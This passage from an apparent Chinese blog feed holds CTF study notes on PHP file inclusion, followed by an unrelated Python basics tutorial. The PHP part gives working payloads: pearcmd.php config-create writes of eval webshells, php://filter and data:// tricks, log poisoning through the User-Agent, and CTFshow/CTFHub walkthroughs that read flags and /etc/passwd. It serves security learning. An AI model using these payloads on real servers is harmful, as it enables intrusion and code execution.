（2）通过猜测默认的Session存放位置进行尝试。通常Linux下Session默认存储在&#x2F;var&#x2F;lib&#x2F;php&#x2F;session或者&#x2F;tmp目录下。默认存储Session存放位置。
包含该session文件：网址/file_included.php?file=../../../../var/lib/php/session/sess_ID
更具体的描述可见：session文件包含漏洞详解

 默认情况下，PHP.ini 中设置的 SESSION 保存方式是 files（session.save_handler &#x3D; files），即使用读写文件的方式保存 SESSION 数据，而 SESSION 文件保存的目录由 session.save_path 指定，文件名以 sess_ 为前缀，后跟 SESSION ID，如：sess_c72665af28a8b14c0fe11afe3b59b51b。文件中的数据即是序列化之后的 SESSION 数据了。
session.upload_progress与open_basedir、allow_url_fopen、allow_url_include等PHP配置一样，session.upload_progress也是PHP的一个功能，同样可以在php.ini中设置相关属性
最重要的几个设置：
session.upload_progress.enabled = onsession.upload_progress.cleanup = onsession.upload_progress.prefix = &quot;upload_progress_&quot;session.upload_progress.name = &quot;PHP_SESSION_UPLOAD_PROGRESS&quot;

1.session.upload_progress.enabled
可以控制是否开启session.upload_progress功能，是 PHP 中用于启用或禁用上传进度跟踪的配置选项。
当将该选项设置为 true 时，PHP 将会启用上传进度跟踪功能。这个功能允许你追踪上传文件的进度。这在处理大文件上传时非常有用，因为它允许用户了解文件上传的进度情况。
2.session.upload_progress.cleanup可以控制是否在上传之后删除文件内容
3.session.upload_progress.prefix
可以设置上传文件内容的前缀（即Session变量名前缀）
举例来说，如果 session.upload_progress.prefix 被设置为 &quot;upload_progress_&quot;，那么 PHP 将会在 Session 中创建类似于 &quot;upload_progress_123456&quot; 的变量来存储上传进度信息。这里的 123456 是 PHP 自动生成的唯一标识符，用于区分不同的上传请求。
通过设置 session.upload_progress.prefix，您可以定义存储上传进度信息的 Session 变量名称的前缀，以便在多个应用程序或系统中更好地管理和识别这些信息。
4**.session.upload_progress.name**
这个配置项用于定义存储上传进度信息的 Session 变量的名称。在使用上传进度跟踪功能时，PHP 将会在 Session 中创建一个特殊的变量来存储上传的文件的进度信息，并且此变量的名称可以由 session.upload_progress.name 来定义。
name当它出现在表单中，php将会报告上传进度，最大的好处是，它的值可控
前置知识Linux和Nginx默认session文件存放路径：
/var/lib/php/sess_PHPSESSID（第二通常的）/var/lib/php/sessions/sess_PHPSESSID/tmp/sess_PHPSESSID（最最通常的）/tmp/sessions/sess_PHPSESSID

session_start()简介
读取名为PHPSESSID（如果没有改变默认值）的cookie值，假使为abc123。
（2）若读取到PHPSESSID这个COOKIE，创建SESSION变量，并从相应的目录中（可以在php.ini中设置）读取SESSabc123（默认是这种命名方式）文件，将字符装在入SESSION变量中；
（3）若没有读取到PHPSESSID这个COOKIE，也会创建SESSION超全局变量注册session变量。同时创建一个sess_abc321(名称为随机值)的session文件，同时将abc321作为PHPSESSID的cookie值返回给浏览器端。
pearcmd.php漏洞1.概念pecl是PHP中用于管理扩展而使用的命令行工具，而pear是pecl依赖的类库。在7.3及以前，pecl&#x2F;pear是默认安装的；
在7.4及以后，需要我们在编译PHP的时候指定–with-pear才会安装。
不过，在Docker任意版本镜像中，pcel&#x2F;pear都会被默认安装，安装的路径在&#x2F;usr&#x2F;local&#x2F;lib&#x2F;php。
要利用这个pearcmd.php需要满足几个条件：
（1）要开启register_argc_argv这个选项在Docker中使自动开启的
（2）要有文件包含的利用
2.如何利用看到config-create，去阅读其代码和帮助，可以知道，这个命令需要传入两个参数，其中第二个参数是写入的文件路径，第一个参数会被写入到这个文件中。
所以最后构造出payload
例子1：/index.php?+config-create+/&amp;file=/usr/local/lib/php/pearcmd.php&amp;/&lt;?=phpinfo()?&gt;+/tmp/hello.php
上面是将写到&#x2F;tmp&#x2F;hello.php,然后我们再使用文件包含进行包含我们之前写入的文件（hello.php）就可以了。
例子2：payload:/index.php?+config-create+/&amp;file=/usr/local/lib/php/pearcmd&amp;/&lt;?=@eval($_POST[1])?&gt;+/tmp/hello.php
3.注意用burpsuite传GET，用hackbar会被url编码，传入文件无法解析
4.实战详见另一篇文章《解题心得》

借鉴的文章：https://blog.csdn.net/JCPS_Y/article/details/127541665
php伪协议php支持的伪协议
1 file:&#x2F;&#x2F; — 访问本地文件系统2 http:&#x2F;&#x2F; — 访问 HTTP(s) 网址3 ftp:&#x2F;&#x2F; — 访问 FTP(s) URLs4 php:&#x2F;&#x2F; — 访问各个输入&#x2F;输出流（I&#x2F;O streams）5 zlib:&#x2F;&#x2F; — 压缩流6 data:&#x2F;&#x2F; — 数据（RFC 2397）7 glob:&#x2F;&#x2F; — 查找匹配的文件路径模式8 phar:&#x2F;&#x2F; — PHP 归档9 ssh2:&#x2F;&#x2F; — Secure Shell 210 rar:&#x2F;&#x2F; — RAR11 ogg:&#x2F;&#x2F; — 音频流12 expect:&#x2F;&#x2F; — 处理交互式的流
php:&#x2F;&#x2F;filter基础php:&#x2F;&#x2F;filter 是一种元封装器， 设计用于数据流打开时的筛选过滤应用。 这对于一体式（all-in-one）的文件函数非常有用，类似 readfile()、 file() 和 file_get_contents()， 在数据流内容读取之前没有机会应用其他过滤器。
简单通俗的说，这是一个中间件，在读入或写入数据的时候对数据进行处理后输出的一个过程。
php:&#x2F;&#x2F;filter可以获取指定文件源码。当它与包含函数结合时，php:&#x2F;&#x2F;filter流会被当作php文件执行。所以我们一般对其进行编码，让其不执行。从而导致 任意文件读取。
协议参数：



名称
描述



resource&#x3D;&lt;要过滤的数据流&gt;
这个参数是必须的。它指定了你要筛选过滤的数据流。


read&#x3D;&lt;读链的筛选列表&gt;
该参数可选。可以设定一个或多个过滤器名称，以管道符（&#96;


write&#x3D;&lt;写链的筛选列表&gt;
该参数可选。可以设定一个或多个过滤器名称，以管道符（&#96;


&lt;；两个链的筛选列表&gt;
任何没有以 read= 或 write= 作前缀 的筛选器列表会视情况应用于读或写链。


常用：
php://filter/read=convert.base64-encode/resource=index.phpphp://filter/resource=index.php

利用filter协议读文件±，将index.php通过base64编码后进行输出。这样做的好处就是如果不进行编码，文件包含后就不会有输出结果，而是当做php文件执行了，而通过编码后则可以读取文件源码。
而使用的convert.base64-encode，就是一种过滤器。
利用filter伪协议绕过死亡exit什么是死亡exit死亡exit指的是在进行写入PHP文件操作时，执行了以下函数：
file_put_contents($content, &#x27;&lt;?php exit();&#x27; . $content);亦或者file_put_contents($content, &#x27;&lt;?php exit();?&gt;&#x27; . $content);

这样，当你插入一句话木马时，文件的内容是这样子的：
&lt;?php exit();?&gt;&lt;?php @eval($_POST[&#x27;snakin&#x27;]);?&gt;

这样即使插入了一句话木马，在被使用的时候也无法被执行。这样的死亡exit通常存在于缓存、配置文件等等不允许用户直接访问的文件当中。
（1）base64decode绕过利用filter协议来绕过，看下这样的代码：
&lt;?php$content = &#x27;&lt;?php exit; ?&gt;&#x27;;$content .= $_POST[&#x27;txt&#x27;];file_put_contents($_POST[&#x27;filename&#x27;], $content);

当用户通过POST方式提交一个数据时，会与死亡exit进行拼接，从而避免提交的数据被执行。
然而这里可以利用php:&#x2F;&#x2F;filter的base64-decode方法，将$content解码，利用php base64_decode函数特性去除死亡exit。
base64编码中只包含64个可打印字符，当PHP遇到不可解码的字符时，会选择性的跳过，这个时候base64就相当于以下的过程：
&lt;?php$_GET[&#x27;txt&#x27;] = preg_replace(&#x27;|[^a-z0-9A-Z+/]|s&#x27;, &#x27;&#x27;, $_GET[&#x27;txt&#x27;]);base64_decode($_GET[&#x27;txt&#x27;]);

所以，当$content 包含 &lt;?php exit; ?&gt;时，解码过程会先去除识别不了的字符，&lt; ; ? &gt;和空格等都将被去除，于是剩下的字符就只有phpexit以及我们传入的字符了。由于base64是4个byte一组，再添加一个字符例如添加字符’a’后，将’phpexita’当做两组base64进行解码，也就绕过这个死亡exit了。
这个时候后面再加上编码后的一句话木马，就可以getshell了。
（2）strip_tags绕过这个&lt;?php exit; ?&gt;实际上是一个XML标签，既然是XML标签，我们就可以利用strip_tags函数去除它，而php:&#x2F;&#x2F;filter刚好是支持这个方法的。
但是我们要写入的一句话木马也是XML标签，在用到strip_tags时也会被去除。
注意到在写入文件的时候，filter是支持多个过滤器的。可以先将webshell经过base64编码，strip_tags去除死亡exit之后，再通过base64-decode复原。
过滤器字符串过滤器该类通常以string开头，对每个字符都进行同样方式的处理。
string.rot13
一种字符处理方式，字符右移十三位
 str_rot13（自 PHP 4.3.0 起等同于用 str_rot13()函数处理所有的流数据）—对字符串执行ROT13转换. ROT13 是一种简单的替换密码，将字母表中的每个字母向后移动13个位置,同时忽略非字母表中的字符。这意味着对一个字符进行 ROT13 编码两次会得到原始字符。
$string = &quot;Hello, World!&quot;;$encoded = str_rot13($string);$decoded = str_rot13($encoded);echo $encoded; // 输出 &quot;Uryyb, Jbeyq!&quot;echo $decoded; // 输出 &quot;Hello, World!&quot;

string.toupper
 string.toupper（自 PHP 5.0.0 起等同于用 strtoupper()函数处理所有的流数据）使用此过滤器,将字符串转化为大写
string.tolower
 string.tolower（自 PHP 5.0.0 起等同于用 strtolower()函数处理所有的流数据）使用此过滤器,将字符串转化为小写
 string.strip_tags(自 PHP 7.3.0 起废弃)​ string.strip_tags使用此过滤器等同于用 strip_tags()函数处理所有的流数据。可以用两种格式接收参数：一种是和strip_tags()函数第二个参数相似的一个包含有标记列表的字符串，一种是一个包含有标记名的数组。从字符串中去除 HTML 和 PHP 标记.该函数尝试返回给定的字符串str去除空字符、HTML 和 PHP 标记后的结果。与strip_tags()函数该过滤器会完全去除所有的 HTML 和 PHP 标签**，无法通过参数来指定允许保留的标签。
$html = &quot;&lt;p&gt;Hello, &lt;b&gt;World!&lt;/b&gt;&lt;/p&gt;&quot;;$filtered = file_get_contents(&#x27;php://filter/string.strip_tags/resource=data:text/plain,&#x27; . urlencode($html));#进行编码防止乱码出现echo $filtered; // 输出 &quot;Hello, World!&quot;

转换过滤器（1）对数据流进行编码，通常用来读取文件源码。
convert.base64-encode &amp; convert.base64-decode
（2）base64加密解密
convert.quoted-printable-encode &amp; convert.quoted-printable-decode
可以翻译为可打印字符引用编码，使用可以打印的ASCII编码的字符表示各种编码形式下的字符。
压缩过滤器虽然 压缩封装协议 提供了在本地文件系统中 创建 gzip 和 bz2 兼容文件的方法，但不代表可以在网络的流中提供通用压缩的意思，也不代表可以将一个非压缩的流转换成一个压缩流。对此，压缩过滤器可以在任何时候应用于任何流资源。
 zlib.deflate（压缩）和 zlib.inflate（解压）实现了定义与 » RFC 1951 的压缩算法。 deflate 过滤器可以接受以一个关联数组传递的最多三个参数。 level定义了压缩强度（1-9）。 数字更高通常会产生更小的载荷，但要消耗更多的处理时间。 存在两个特殊压缩等级：0（完全不压缩）和 -1（zlib 内部默认值，目前是 6）。 window是压缩回溯窗口大小，以二的次方表示。 更高的值（大到 15 —— 32768 字节）产生更好的压缩效果但消耗更多内存， 低的值（低到 9 —— 512 字节）产生产生较差的压缩效果但内存消耗低。 目前默认的 window 大小是 **15**。 memory用来指示要分配多少工作内存。 合法的数值范围是从 1（最小分配）到 9（最大分配）。 内存分配仅影响速度，不会影响生成的载荷的大小。
Note: 压缩过滤器 不产生命令行工具如 gzip的头和尾信息。只是压缩和解压数据流中的有效载荷部分。 zlib.* 压缩过滤器自 PHP 版本 5.1.0起可用，在激活 zlib的前提下。也可以通过安装来自 » PECL的 » zlib_filter包作为一个后门在 5.0.x版中使用。此过滤器在 PHP 4 中 不可用。?file=compress.zlib://flag.php

加密过滤器mcrypt.*和 mdecrypt.*使用 libmcrypt 提供了对称的加密和解密。
更多妙用：https://www.leavesongs.com/PENETRATION/php-filter-magic.html
data:&#x2F;&#x2F;数据流封装器，以传递相应格式的数据。可以让用户来控制输入流，当它与包含函数结合时，用户输入的data:&#x2F;&#x2F;流会被当作php文件执行。
1、data://text/plain,http://127.0.0.1/include.php?file=data://text/plain,&lt;?php%20phpinfo();?&gt; 2、data://text/plain;base64,经过base64编码再经过url编码的数据http://127.0.0.1/include.php?file=data://text/plain;base64,PD9waHAgcGhwaW5mbygpOz8%2b


知识点补充：base64编码
Base64 不是加密算法，而是一种编码方式，常用于将二进制数据转换为文本数据。Base64 编码通过将数据转换为一种由 64 个不同字符组成的 ASCII 字符串来表示二进制数据。
在 PHP 中，你可以使用 base64_encode() 函数来对数据进行 Base64 编码，以及使用 base64_decode() 函数将 Base64 编码的数据解码为原始数据。

例子一：打印 data:&#x2F;&#x2F; 的内容
&lt;?php// 打印 &quot;I love PHP&quot;echo  file_get_contents ( &#x27;data://text/plain;base64,SSBsb3ZlIFBIUAo=&#x27; );?&gt;

对该代码的解释：这段 PHP 代码使用了 file_get_contents 函数来读取指定 URI 的内容并将其输出。
具体来说，file_get_contents 函数用于从文件中读取内容。在这个例子中，它读取的是一个 Data URI，这是一种在 URL 中嵌入数据的方式。Data URI 是一种将小文件直接嵌入到文档中的方案，通常用于将图片、音频、文本等文件编码为字符串，这样就可以直接在 URL 中传输。
在这里，data:&#x2F;&#x2F; 前缀表示将从数据流中读取内容，text&#x2F;plain;base64 指定了数据的 MIME 类型（这里是文本类型，并且内容是经过 Base64 编码的），后面的 Base64 编码字符串 SSBsb3ZlIFBIUAo&#x3D; 实际上是文本字符串 “I love PHP” 的 Base64 编码。
所以，file_get_contents(‘data:&#x2F;&#x2F;text&#x2F;plain;base64,SSBsb3ZlIFBIUAo&#x3D;’) 读取了这个 Base64 编码字符串，并将其解码为 “I love PHP”，最后通过 echo 命令输出到页面上。
例子二：获取媒体类型
&lt;?php$fp    =  fopen ( &#x27;data://text/plain;base64,&#x27; ,  &#x27;r&#x27; );$meta  =  stream_get_meta_data ( $fp );// 打印 &quot;text/plain&quot;echo  $meta [ &#x27;mediatype&#x27; ];?&gt;

解释：这段 PHP 代码使用了 fopen 函数以只读模式打开一个 Data URI 的资源，然后使用 stream_get_meta_data 函数获取有关资源的元数据。
具体来说，fopen 函数打开了一个指向 Data URI 的文件句柄 $fp，但是在这个例子中，Data URI 的内容部分是空的。这个 Data URI 是 text/plain 类型的数据流，但是没有提供实际的数据内容。所以实际上没有内容可读，只是打开了这个数据流。
然后，stream_get_meta_data 函数用于获取与 $fp 文件句柄相关的元数据。在这里，$meta 变量接收了这些元数据。其中，$meta[&#39;mediatype&#39;] 表示这个数据流的媒体类型。由于在打开时未提供具体的 Base64 编码数据，所以无法读取实际的内容，但能够得到的是媒体类型的信息。
3.file:&#x2F;&#x2F;用于访问本地文件系统，若不加协议名称，默认为file://协议；并且不受allow_url_fopen，allow_url_include影响file:&#x2F;&#x2F;协议主要用于访问文件(绝对路径、相对路径以及网络路径)
#Linuxcmd=file:///path/to/flag    #根目录下path文件夹中to文件夹下flag文件 ——此处有///三条cmd=file://relative/path/flag    #当前目录下relative文件夹中path文件夹下flag文件cmd=file://flag    #当前目录下的flag文件#Windows    cmd=file://C:/path/to/flag.txt #C盘中path文件夹中to文件夹下flag文件cmd=file://C:flag.txt  #C盘下flag文件cmd=file://flag.txt  #当前文件夹下flag文件

注意：当不说明使用file:&#x2F;&#x2F;协议时（即默认file:&#x2F;&#x2F;协议的情况）可以使用相对路径，当使用了file协议时无法使用相对路径
4.php:&#x2F;&#x2F;在allow_url_fopen，allow_url_include(:仅php://input 、php://stdin、php://memory、php://temp 需要on)都关闭的情况下可以正常使用php:&#x2F;&#x2F;作用为访问输入输出流
5.php:&#x2F;&#x2F;inputphp:&#x2F;&#x2F;input可以访问请求的原始数据的只读流，将post请求的数据当作php代码执行。当传入的参数作为文件名打开时，可以将参数设为php:&#x2F;&#x2F;input,同时post想设置的文件内容，php执行时会将post内容当作文件内容。从而导致任意代码执行。
例如：
http://127.0.0.1/cmd.php?cmd=php://inputPOST数据：&lt;?php phpinfo()?&gt;

注意：当enctype=&quot;multipart/form-data&quot;的时候 php://input是无效的
遇到file_get_contents()要想到用php://input绕过。
6.zip:&#x2F;&#x2F;zip:&#x2F;&#x2F; 可以访问压缩包里面的文件。当它与包含函数结合时，zip:&#x2F;&#x2F;流会被当作php文件执行。从而实现任意代码执行。

7.http:&#x2F;&#x2F;访问 HTTP(s) 网址
条件：

allow_url_fopen:on
allow_url_include:on

作用：常规 URL 形式，允许通过 HTTP 1.0 的 GET方法，以只读访问文件或资源。CTF中通常用于远程包含。
使用示例：以传参变量名为cmd演示
PHPcmd=http://example.com/phpinfo.txt	#读取http://example.com/phpinfo.txt文件cmd=https://example.com/file.php?var1=val1&amp;var2=val2	#读取https://example.com/file.php文件并且传入var1和var2的值

CTFshowweb78&lt;?phpif(isset($_GET[&#x27;file&#x27;]))&#123;    $file = $_GET[&#x27;file&#x27;];    include($file);&#125;else&#123;    highlight_file(__FILE__);&#125;

一道经典的文件包含题目
首先我们get传参：?file=/../../../../../etc/passwd，回显说明可以文件包含（当然这题可以直接跳过这个步骤）
然后就是利用php伪协议来获取所需的文件：?file=php://filter/convert.base64-encode/resource=flag.php
web79&lt;?phpif(isset($_GET[&#x27;file&#x27;]))&#123;    $file = $_GET[&#x27;file&#x27;];    $file = str_replace(&quot;php&quot;, &quot;???&quot;, $file);    include($file);&#125;else&#123;    highlight_file(__FILE__);&#125;

根据代码所示出现php会被问号代替
由于有include函数，所以联想到伪协议data://，然后利用短标签来写php代码
首先查看当前目录下的文件：?file=data://text/plain,&lt;?=system(&#39;ls&#39;);?&gt;，目录下有个Flag文件
接着打印出该文件（用base64编码一下）：?file=data://text/plain,&lt;?=system(&#39;cat flag*|base64&#39;);?&gt;
拿去解码，得到所要的flag
web80&lt;?phpif(isset($_GET[&#x27;file&#x27;]))&#123;    $file = $_GET[&#x27;file&#x27;];    $file = str_replace(&quot;php&quot;, &quot;???&quot;, $file);    $file = str_replace(&quot;data&quot;, &quot;???&quot;, $file);    include($file);&#125;else&#123;    highlight_file(__FILE__);&#125;

用日志包含来绕过
首先用bp抓包，尝试访问：/../../../../etc/passwd，部分回显如下图所示：
从中可以知道用的是nginx，而nginx默认日志路径 /var/log/nginx/access.log
所以我们尝试访问：?file=/var/log/nginx/access.log，成功
然后在UA头处输入代码：&lt;?php @eval($_POST[&#39;shell&#39;]);?&gt;（记住要是单引号，双引号会被转义掉）
然后用蚁剑连接上，题目解决
第二种方法：可以大小写绕过：?file=PHP://input
web81&lt;?phpif(isset($_GET[&#x27;file&#x27;]))&#123;    $file = $_GET[&#x27;file&#x27;];    $file = str_replace(&quot;php&quot;, &quot;???&quot;, $file);    $file = str_replace(&quot;data&quot;, &quot;???&quot;, $file);    $file = str_replace(&quot;:&quot;, &quot;???&quot;, $file);    include($file);&#125;else&#123;    highlight_file(__FILE__);&#125;

按照上题的日志包含解决题目
CTFHubRCE-文件包含&lt;?phperror_reporting(0);if (isset($_GET[&#x27;file&#x27;])) &#123;    if (!strpos($_GET[&quot;file&quot;], &quot;flag&quot;)) &#123;        include $_GET[&quot;file&quot;];    &#125; else &#123;        echo &quot;Hacker!!!&quot;;    &#125;&#125; else &#123;    highlight_file(__FILE__);&#125;?&gt;&lt;hr&gt;i have a &lt;a href=&quot;shell.txt&quot;&gt;shell&lt;/a&gt;, how to use it ?

利用题目提供的shell.txt来进行绕过：?file=shell.txt
根据该文件里面的内容，post传参：ctfhub=system(&#39;cat /flag&#39;);
题目解决
php:&#x2F;&#x2F;input&lt;?phpif (isset($_GET[&#x27;file&#x27;])) &#123;    if ( substr($_GET[&quot;file&quot;], 0, 6) === &quot;php://&quot; ) &#123;        include($_GET[&quot;file&quot;]);    &#125; else &#123;        echo &quot;Hacker!!!&quot;;    &#125;&#125; else &#123;    highlight_file(__FILE__);&#125;?&gt;&lt;hr&gt;i don&#x27;t have shell, how to get flag? &lt;br&gt;&lt;a href=&quot;phpinfo.php&quot;&gt;phpinfo&lt;/a&gt;

通过查看题目给的phpinfo，有如下发现：
这说明了可以使用php:&#x2F;&#x2F;input
第一种方法，使用php://input，如下：

得到所需文件地址，打印出来，题目解决

远程包含&lt;?phperror_reporting(0);if (isset($_GET[&#x27;file&#x27;])) &#123;    if (!strpos($_GET[&quot;file&quot;], &quot;flag&quot;)) &#123;        include $_GET[&quot;file&quot;];    &#125; else &#123;        echo &quot;Hacker!!!&quot;;    &#125;&#125; else &#123;    highlight_file(__FILE__);&#125;?&gt;&lt;hr&gt;i don&#x27;t have shell, how to get flag?&lt;br&gt;&lt;a href=&quot;phpinfo.php&quot;&gt;phpinfo&lt;/a&gt;

 if (!strpos($_GET[&quot;file&quot;], &quot;flag&quot;))发现题目要求必须使用非含flag的文件进行包含，则此时可以考虑进行远程包含。在服务器上建立一个txt文件（不能是php文件哟），如下：
&lt;?php   system(&#x27;ls /&#x27;);?&gt;

得到根目录上面的文件列表，然后打印出我们所需的文件
&lt;?php   system(&#x27;cat /flag&#x27;);?&gt;

得到flag，题目解决
读取源代码&lt;?phperror_reporting(E_ALL);if (isset($_GET[&#x27;file&#x27;])) &#123;    if ( substr($_GET[&quot;file&quot;], 0, 6) === &quot;php://&quot; ) &#123;        include($_GET[&quot;file&quot;]);    &#125; else &#123;        echo &quot;Hacker!!!&quot;;    &#125;&#125; else &#123;    highlight_file(__FILE__);&#125;?&gt;&lt;hr&gt;i don&#x27;t have shell, how to get flag? &lt;br&gt;flag in &lt;code&gt;/flag&lt;/code&gt;

使用php伪协议中的 php://filter来读取flag文件，题目解决
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>前端</tag>
        <tag>web</tag>
      </tags>
  </entry>
  <entry>
    <title>python笔记</title>
    <url>/2024/01/15/python_max/python%E7%AC%94%E8%AE%B0/</url>
    <content><![CDATA[python基础数据类型转换int() 强制转换为整型
float() 强制转换为浮点型
str() 强制转换为字符串类型
x = str(&quot;s1&quot;) # x 输出结果为 &#x27;s1&#x27;y = str(2)    # y 输出结果为 &#x27;2&#x27;z = str(3.0)  # z 输出结果为 &#x27;3.0&#x27;

整型和字符串类型进行运算，就可以用强制类型转换来完成
num_int = 123num_str = &quot;456&quot;print(&quot;num_int 数据类型为:&quot;,type(num_int))print(&quot;类型转换前，num_str 数据类型为:&quot;,type(num_str))num_str = int(num_str)    # 强制转换为整型print(&quot;类型转换后，num_str 数据类型为:&quot;,type(num_str))num_sum = num_int + num_strprint(&quot;num_int 与 num_str 相加结果为:&quot;,num_sum)print(&quot;sum 数据类型为:&quot;,type(num_sum))

运算符python位运算符
按位运算符是把数字看作二进制来进行计算的
假设a&#x3D;60,b&#x3D;13二进制格式为：a &#x3D; 0011 1100；b &#x3D; 0000 1101



运算符
描述
实测



&amp;
按位与运算符：参与运算的两个值,如果两个相应位都为1,则该位的结果为1,否则为0
(a &amp; b) 输出结果 12 ，二进制解释： 0000 1100


|
按位或运算符：只要对应的二个二进位有一个为1时，结果位就为1
(a|b)输出结果 61 ，二进制解释： 0011 1101


^
按位异或运算符：当两对应的二进位相异时，结果为1
(a ^ b) 输出结果 49 ，二进制解释： 0011 0001


~
按位取反运算符：对数据的每个二进制位取反,即把1变为0,把0变为1。**~x** 类似于 -x-1
(~a ) 输出结果 -61 ，二进制解释： 1100 0011， 在一个有符号二进制数的补码形式。


&lt;&lt;
左移动运算符：运算数的各二进位全部左移若干位，由”&lt;&lt;”右边的数指定移动的位数，高位丢弃，低位补0。
a &lt;&lt; 2 输出结果 240 ，二进制解释： 1111 0000


&gt;&gt;
右移动运算符：把”&gt;&gt;”左边的运算数的各二进位全部右移若干位，”&gt;&gt;”右边的数指定移动的位数
a &gt;&gt; 2 输出结果 15 ，二进制解释： 0000 1111


逻辑运算符
a&#x3D;10,b&#x3D;20



运算符
逻辑表达式
描述
实例



and
x and y
布尔”与” - 如果 x 为 False，x and y 返回 x 的值，否则返回 y 的计算值
(a and b) 返回 20。


or
x or y
布尔”或” - 如果 x 是 True，它返回 x 的值，否则它返回 y 的计算值。
(a or b) 返回 10。


not
not x
布尔”非” - 如果 x 为 True，返回 False 。如果 x 为 False，它返回 True。
not(a and b) 返回 False


成员运算符



运算符
描述
实例



in
如果在指定的序列中找到值返回 True，否则返回 False
x 在 y 序列中 , 如果 x 在 y 序列中返回 True


not in
如果在指定的序列中没有找到值返回 True，否则返回 False
x 不在 y 序列中 , 如果 x 不在 y 序列中返回 True


a = 10b = 20list = [1, 2, 3, 4, 5 ]if ( a in list ):   print (&quot;1 - 变量 a 在给定的列表中 list 中&quot;)else:   print (&quot;1 - 变量 a 不在给定的列表中 list 中&quot;)if ( b not in list ):   print (&quot;2 - 变量 b 不在给定的列表中 list 中&quot;)else:   print (&quot;2 - 变量 b 在给定的列表中 list 中&quot;)

身份运算符
身份运算符用于比较两个对象的存储单元(就是地址)



运算符
描述
实例



is
is 是判断两个标识符是不是引用自一个对象
x is y, 类似 id(x) &#x3D;&#x3D; id(y) , 如果引用的是同一个对象则返回 True，否则返回 False


is not
is not 是判断两个标识符是不是引用自不同对象
x is not y ， 类似 **id(x) !&#x3D; id(y)**。如果引用的不是同一个对象则返回结果 True，否则返回 False


id()函数用于获取对象内存地址
数字数学函数
相关函数
随机数函数
相关函数
三角函数
相关函数
数学常量



常量
描述



pi
数学常量 pi（圆周率，一般以π来表示）


e
数学常量 e，e即自然常数（自然常数）


字符串python中访问子字符串，可以使用方括号 []来截取字符串，格式为：变量[头下标:尾下标]；索引值索引值以 0 为开始值，**-1** 为从末尾的开始位置
（注意：截取的字符串内容不包括尾下标；切片的规则是始终从左到右进行）

var1 = &#x27;Hello World!&#x27;var2 = &quot;Runoob&quot; print (&quot;var1[0]: &quot;, var1[0])print (&quot;var2[1:5]: &quot;, var2[1:5])执行结果如下：var1[0]:  Hvar2[1:5]:  unoo

也可以截取字符串的一部分并与其他字段拼接
var1 = &#x27;Hello World!&#x27;print (&quot;已更新字符串 : &quot;, var1[:6] + &#x27;Runoob!&#x27;)

转义字符
相关字符表格 
三引号
python三引号允许一个字符串跨多行，字符串中可以包含换行符、制表符以及其他特殊字符
para_str = &quot;&quot;&quot;这是一个多行字符串的实例多行字符串可以使用制表符TAB ( \t )。也可以使用换行符 [ \n ]。&quot;&quot;&quot;print (para_str)

字符串内建函数
好多，具体见下面链接
链接
f-string
f-string 格式化字符串以 f 开头，后面跟着字符串，字符串中的表达式用大括号 {} 包起来，它会将变量或表达式计算后的值替换进去
&gt;&gt;&gt; name = &#x27;Runoob&#x27;&gt;&gt;&gt; f&#x27;Hello &#123;name&#125;&#x27;  # 替换变量&#x27;Hello Runoob&#x27;&gt;&gt;&gt; f&#x27;&#123;1+2&#125;&#x27;         # 使用表达式&#x27;3&#x27;&gt;&gt;&gt; w = &#123;&#x27;name&#x27;: &#x27;Runoob&#x27;, &#x27;url&#x27;: &#x27;www.runoob.com&#x27;&#125;&gt;&gt;&gt; f&#x27;&#123;w[&quot;name&quot;]&#125;: &#123;w[&quot;url&quot;]&#125;&#x27;&#x27;Runoob: www.runoob.com&#x27;

这种方法更简单，不用判断用%s还是，%d。
列表可以使用 append() 方法来添加列表项
list1 = [&#x27;Google&#x27;, &#x27;Runoob&#x27;, &#x27;Taobao&#x27;]list1.append(&#x27;Baidu&#x27;)print (&quot;更新后的列表 : &quot;, list1)

可以使用 del 语句来删除列表中的元素
list = [&#x27;Google&#x27;, &#x27;Runoob&#x27;, 1997, 2000] print (&quot;原始列表 : &quot;, list)del list[2]print (&quot;删除第三个元素 : &quot;, list)

列表脚本操作符
列表对 + 和 * 的操作符与字符串相似。+ 号用于组合列表，* 号用于重复列表



Python 表达式
结果
描述



len([1, 2, 3])
3
长度


[1, 2, 3] + [4, 5, 6]
[1, 2, 3, 4, 5, 6]
组合


[‘Hi!’] * 4
[‘Hi!’, ‘Hi!’, ‘Hi!’, ‘Hi!’]
重复


3 in [1, 2, 3]
True
元素是否存在于列表中


for x in [1, 2, 3]: print(x, end&#x3D;” “)
1 2 3
迭代


嵌套列表
在列表里面创建其它列表
&gt;&gt;&gt; a = [&#x27;a&#x27;, &#x27;b&#x27;, &#x27;c&#x27;]&gt;&gt;&gt; n = [1, 2, 3]&gt;&gt;&gt; x = [a, n]&gt;&gt;&gt; x[[&#x27;a&#x27;, &#x27;b&#x27;, &#x27;c&#x27;], [1, 2, 3]]&gt;&gt;&gt; x[0][&#x27;a&#x27;, &#x27;b&#x27;, &#x27;c&#x27;]&gt;&gt;&gt; x[0][1]&#x27;b&#x27;

列表函数&amp;方法



方法
描述



list.append(x)
把一个元素添加到列表的结尾，相当于 a[len(a):] &#x3D; [x]。


list.extend(L)
通过添加指定列表的所有元素来扩充列表，相当于 a[len(a):] &#x3D; L。


list.insert(i, x)
在指定位置插入一个元素。第一个参数是准备插入到其前面的那个元素的索引，例如 a.insert(0, x) 会插入到整个列表之前，而 a.insert(len(a), x) 相当于 a.append(x) 。


list.remove(x)
删除列表中值为 x 的第一个元素。如果没有这样的元素，就会返回一个错误。


list.pop([i])
从列表的指定位置移除元素，并将其返回。如果没有指定索引，a.pop()返回最后一个元素。元素随即从列表中被移除。（方法中 i 两边的方括号表示这个参数是可选的，而不是要求你输入一对方括号，你会经常在 Python 库参考手册中遇到这样的标记。）


list.clear()
移除列表中的所有项，等于del a[:]。


list.index(x)
返回列表中第一个值为 x 的元素的索引。如果没有匹配的元素就会返回一个错误。


list.count(x)
返回 x 在列表中出现的次数。


list.sort()
对列表中的元素进行排序。


list.reverse()
倒排列表中的元素。


list.copy()
返回列表的浅复制，等于a[:]。


把列表当作堆栈使用
列表方法使得列表可以很方便的作为一个堆栈来使用，堆栈作为特定的数据结构，最先进入的元素最后一个被释放（后进先出）。用 append() 方法可以把一个元素添加到堆栈顶。用不指定索引的 pop() 方法可以把一个元素从堆栈顶释放出来
stack = [3, 4, 5]stack.append(6)stack.append(7)stack.pop()print(stack)

元组（tuple）元组使用小括号 **( )**，列表使用方括号 **[ ]**。
元组创建很简单，只需要在括号中添加元素，并使用逗号隔开即可
元组中只包含一个元素时，需要在元素后面添加逗号 ，否则括号会被当作运算符使用
